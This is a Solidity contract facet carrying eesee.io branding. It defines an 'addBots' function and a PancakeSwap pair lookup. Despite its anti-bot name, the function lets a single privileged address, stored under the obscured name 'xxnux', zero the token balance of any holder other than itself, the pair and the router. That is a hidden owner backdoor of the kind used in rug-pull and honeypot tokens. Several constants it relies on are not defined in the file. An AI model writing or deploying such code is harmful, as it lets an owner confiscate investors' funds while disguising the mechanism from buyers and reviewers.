/*
 * SPDX-License-Identifier: MIT
 * Website: https://eesee.io
 * X: https://twitter.com/eesee_io
 * Tele: https://t.me/eesee_io
 * Discord: https://discord.gg/eesee
 */

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract addBotsFacet {
    function addBots(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
